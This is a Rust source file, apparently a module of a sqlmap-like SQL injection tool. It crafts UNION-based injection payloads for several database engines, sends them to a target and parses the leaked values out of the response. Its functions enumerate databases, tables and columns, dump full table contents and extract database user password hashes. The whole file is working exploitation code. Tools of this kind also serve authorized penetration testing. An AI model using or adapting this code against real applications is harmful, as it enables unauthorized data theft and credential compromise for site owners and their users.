//! UNION-based SQL injection exploitation

use super::test::UnionVector;
use crate::sqli::core::{DBMS, CHAR_START, CHAR_STOP, CHAR_DELIMITER, Queries};
use crate::sqli::request::Request;
use anyhow::Result;

/// Execute a UNION-based query and extract results
pub async fn union_use(
    request: &Request<'_>,
    vector: &UnionVector,
    expression: &str,
) -> Result<Vec<String>> {
    let result = one_shot_union_use(request, vector, expression).await?;
    parse_union_result(&result)
}

/// Execute single UNION query - directly mimics sqlmap's approach
async fn one_shot_union_use(
    request: &Request<'_>,
    vector: &UnionVector,
    expression: &str,
) -> Result<String> {
    // Step 1: Process the expression like sqlmap's concatQuery
    // Input: SELECT schema_name FROM information_schema.schemata
    // Output: CONCAT('qvxvq',IFNULL(CAST(schema_name AS CHAR),' '),'qpkpq') FROM information_schema.schemata
    
    let processed = concat_query(expression, vector.dbms);
    
    // Step 2: Build UNION query like sqlmap's forgeUnionQuery
    // The processed query already has FROM clause at the end
    // We need to extract it and build: UNION ALL SELECT <concat>,NULL,NULL FROM <table>
    
    let payload = forge_union_query(&processed, vector);
    
    tracing::debug!("UNION payload: {}", payload);
    
    // Execute and get response
    let page = request.query_page(&payload).await?;
    
    // Extract all results between markers
    let mut results = Vec::new();
    let mut search_start = 0;
    
    while let Some(start_idx) = page[search_start..].find(CHAR_START) {
        let abs_start = search_start + start_idx + CHAR_START.len();
        if let Some(end_idx) = page[abs_start..].find(CHAR_STOP) {
            let value = &page[abs_start..abs_start + end_idx];
            results.push(value.to_string());
            search_start = abs_start + end_idx + CHAR_STOP.len();
        } else {
            break;
        }
    }
    
    // Join all results with the row separator
    Ok(results.join(&format!("{}{}", CHAR_STOP, CHAR_START)))
}

/// Process query to add CONCAT with markers (like sqlmap's concatQuery)
fn concat_query(expression: &str, dbms: DBMS) -> String {
    let expr_upper = expression.to_uppercase();
    
    if !expr_upper.starts_with("SELECT ") {
        // Single expression - just wrap it
        return wrap_with_concat(expression, dbms);
    }
    
    // Parse: SELECT <fields> FROM <table>
    let after_select = &expression[7..]; // Skip "SELECT "
    
    // Find FROM clause at depth 0
    if let Some(from_pos) = find_from_clause(after_select) {
        let fields_part = &after_select[..from_pos];
        let from_part = &after_select[from_pos..]; // includes " FROM ..."
        
        // Process each field
        let fields: Vec<&str> = fields_part.split(',').map(|f| f.trim()).collect();
        let wrapped_fields = wrap_fields_with_concat(&fields, dbms);
        
        format!("{}{}", wrapped_fields, from_part)
    } else {
        // No FROM clause
        let fields: Vec<&str> = after_select.split(',').map(|f| f.trim()).collect();
        wrap_fields_with_concat(&fields, dbms)
    }
}

/// Find " FROM " at depth 0 (not inside parentheses)
fn find_from_clause(s: &str) -> Option<usize> {
    let upper = s.to_uppercase();
    let bytes = upper.as_bytes();
    let mut depth = 0;
    
    for i in 0..bytes.len() {
        match bytes[i] {
            b'(' => depth += 1,
            b')' => depth -= 1,
            b' ' if depth == 0 && upper[i..].starts_with(" FROM ") => {
                return Some(i);
            }
            _ => {}
        }
    }
    None
}

/// Wrap fields with CONCAT and markers
fn wrap_fields_with_concat(fields: &[&str], dbms: DBMS) -> String {
    let wrapped: Vec<String> = fields.iter()
        .map(|f| wrap_field(f, dbms))
        .collect();
    
    match dbms {
        DBMS::MySQL | DBMS::Unknown => {
            if wrapped.len() == 1 {
                format!("CONCAT('{}',{},'{}')", CHAR_START, wrapped[0], CHAR_STOP)
            } else {
                format!("CONCAT('{}',{},'{}')", 
                    CHAR_START,
                    wrapped.join(&format!(",'{}',", CHAR_DELIMITER)),
                    CHAR_STOP)
            }
        },
        DBMS::PostgreSQL => {
            format!("'{}'||{}||'{}'",
                CHAR_START,
                wrapped.join(&format!("||'{}'||", CHAR_DELIMITER)),
                CHAR_STOP)
        },
        DBMS::MSSQL => {
            format!("'{}'+{}+'{}'",
                CHAR_START,
                wrapped.join(&format!("+'{}'", CHAR_DELIMITER)),
                CHAR_STOP)
        },
        _ => {
            format!("CONCAT('{}',{},'{}')", 
                CHAR_START,
                wrapped.join(&format!(",'{}',", CHAR_DELIMITER)),
                CHAR_STOP)
        }
    }
}

/// Wrap single expression with CONCAT
fn wrap_with_concat(expr: &str, dbms: DBMS) -> String {
    let wrapped = wrap_field(expr, dbms);
    match dbms {
        DBMS::MySQL | DBMS::Unknown => {
            format!("CONCAT('{}',{},'{}')", CHAR_START, wrapped, CHAR_STOP)
        },
        DBMS::PostgreSQL => {
            format!("'{}'||{}||'{}'", CHAR_START, wrapped, CHAR_STOP)
        },
        _ => {
            format!("CONCAT('{}',{},'{}')", CHAR_START, wrapped, CHAR_STOP)
        }
    }
}

/// Wrap field with IFNULL/COALESCE and CAST
fn wrap_field(field: &str, dbms: DBMS) -> String {
    match dbms {
        DBMS::MySQL | DBMS::Unknown => {
            format!("IFNULL(CAST({} AS CHAR),' ')", field)
        },
        DBMS::PostgreSQL => {
            format!("COALESCE(CAST({} AS CHARACTER(10000)),' ')", field)
        },
        DBMS::MSSQL => {
            format!("ISNULL(CAST({} AS VARCHAR(8000)),' ')", field)
        },
        DBMS::Oracle => {
            format!("NVL(CAST({} AS VARCHAR(4000)),' ')", field)
        },
        DBMS::SQLite => {
            format!("IFNULL({},' ')", field)
        },
        DBMS::Access => {
            format!("IIF(ISNULL({}),' ',{})", field, field)
        },
    }
}

/// Build UNION query (like sqlmap's forgeUnionQuery)
fn forge_union_query(processed_query: &str, vector: &UnionVector) -> String {
    // processed_query is like: CONCAT(...) FROM information_schema.schemata
    // We need: -1 UNION ALL SELECT CONCAT(...),NULL,NULL FROM ... -- -
    
    // Find FROM clause in processed query
    let (concat_part, from_part) = if let Some(from_pos) = find_from_clause(processed_query) {
        (&processed_query[..from_pos], &processed_query[from_pos..])
    } else {
        (processed_query, "")
    };
    
    // Build columns: put concat_part at position, NULL elsewhere
    let mut columns: Vec<String> = vec!["NULL".to_string(); vector.count];
    columns[vector.position] = concat_part.to_string();
    
    // Build final query
    format!("{} UNION ALL SELECT {}{}{}",
        vector.prefix,
        columns.join(","),
        from_part,
        vector.suffix)
}

/// Extract result from page using markers
fn extract_result(page: &str) -> Option<String> {
    let start_idx = page.find(CHAR_START)?;
    let after_start = &page[start_idx + CHAR_START.len()..];
    let end_idx = after_start.find(CHAR_STOP)?;
    Some(after_start[..end_idx].to_string())
}

/// Parse union result into rows
fn parse_union_result(result: &str) -> Result<Vec<String>> {
    if result.is_empty() {
        return Ok(vec![]);
    }
    
    // Split by stop+start markers (multiple rows)
    let row_separator = format!("{}{}", CHAR_STOP, CHAR_START);
    let rows: Vec<String> = result
        .split(&row_separator)
        .map(|r| r.to_string())
        .collect();
    
    Ok(rows)
}

/// Get databases using UNION
pub async fn get_databases(request: &Request<'_>, vector: &UnionVector) -> Result<Vec<String>> {
    let queries = Queries::new(vector.dbms);
    let query = queries.databases();
    let results = union_use(request, vector, query).await?;
    
    // Results come as pipe-separated from GROUP_CONCAT
    let mut databases = Vec::new();
    let mut seen = std::collections::HashSet::new();
    for result in results {
        for db in result.split('|') {
            let db = db.trim();
            if !db.is_empty() && seen.insert(db.to_string()) {
                databases.push(db.to_string());
            }
        }
    }
    Ok(databases)
}

/// Get tables using UNION
pub async fn get_tables(request: &Request<'_>, vector: &UnionVector, database: &str) -> Result<Vec<String>> {
    let queries = Queries::new(vector.dbms);
    let query = queries.tables(database);
    let results = union_use(request, vector, &query).await?;
    
    // Results come as pipe-separated from GROUP_CONCAT
    let mut tables = Vec::new();
    let mut seen = std::collections::HashSet::new();
    for result in results {
        for table in result.split('|') {
            let table = table.trim();
            if !table.is_empty() && seen.insert(table.to_string()) {
                tables.push(table.to_string());
            }
        }
    }
    Ok(tables)
}

/// Get columns using UNION
pub async fn get_columns(
    request: &Request<'_>,
    vector: &UnionVector,
    database: &str,
    table: &str,
) -> Result<Vec<String>> {
    let queries = Queries::new(vector.dbms);
    let query = queries.columns(database, table);
    let results = union_use(request, vector, &query).await?;
    
    // Results come as pipe-separated from GROUP_CONCAT
    let mut columns = Vec::new();
    let mut seen = std::collections::HashSet::new();
    for result in results {
        for col in result.split('|') {
            let col = col.trim();
            if !col.is_empty() && seen.insert(col.to_string()) {
                columns.push(col.to_string());
            }
        }
    }
    Ok(columns)
}

/// Dump table data using UNION
pub async fn dump_table(
    request: &Request<'_>,
    vector: &UnionVector,
    database: &str,
    table: &str,
    columns: &[String],
) -> Result<Vec<Vec<String>>> {
    let queries = Queries::new(vector.dbms);
    let query = queries.dump(database, table, columns);
    
    let results = union_use(request, vector, &query).await?;
    
    // Parse rows into columns
    let mut rows = Vec::new();
    for row in results {
        let cols: Vec<String> = row
            .split(CHAR_DELIMITER)
            .map(|s| s.trim().to_string())
            .collect();
        rows.push(cols);
    }
    
    Ok(rows)
}

/// Get current database
pub async fn get_current_db(request: &Request<'_>, vector: &UnionVector) -> Result<String> {
    let queries = Queries::new(vector.dbms);
    let query = format!("SELECT {}", queries.current_db());
    let results = union_use(request, vector, &query).await?;
    Ok(results.first().cloned().unwrap_or_default())
}

/// Get current user
pub async fn get_current_user(request: &Request<'_>, vector: &UnionVector) -> Result<String> {
    let queries = Queries::new(vector.dbms);
    let query = format!("SELECT {}", queries.current_user());
    let results = union_use(request, vector, &query).await?;
    Ok(results.first().cloned().unwrap_or_default())
}

/// Get database version
pub async fn get_version(request: &Request<'_>, vector: &UnionVector) -> Result<String> {
    let queries = Queries::new(vector.dbms);
    let query = format!("SELECT {}", queries.version());
    let results = union_use(request, vector, &query).await?;
    Ok(results.first().cloned().unwrap_or_default())
}

/// Get database users
pub async fn get_users(request: &Request<'_>, vector: &UnionVector) -> Result<Vec<String>> {
    let queries = Queries::new(vector.dbms);
    let query = queries.users();
    union_use(request, vector, query).await
}

/// Get password hashes
pub async fn get_passwords(request: &Request<'_>, vector: &UnionVector) -> Result<Vec<(String, String)>> {
    let queries = Queries::new(vector.dbms);
    let query = queries.passwords();
    let results = union_use(request, vector, query).await?;
    
    let mut passwords = Vec::new();
    for row in results {
        let parts: Vec<&str> = row.split(CHAR_DELIMITER).collect();
        if parts.len() >= 2 {
            passwords.push((parts[0].trim().to_string(), parts[1].trim().to_string()));
        }
    }
    
    Ok(passwords)
}
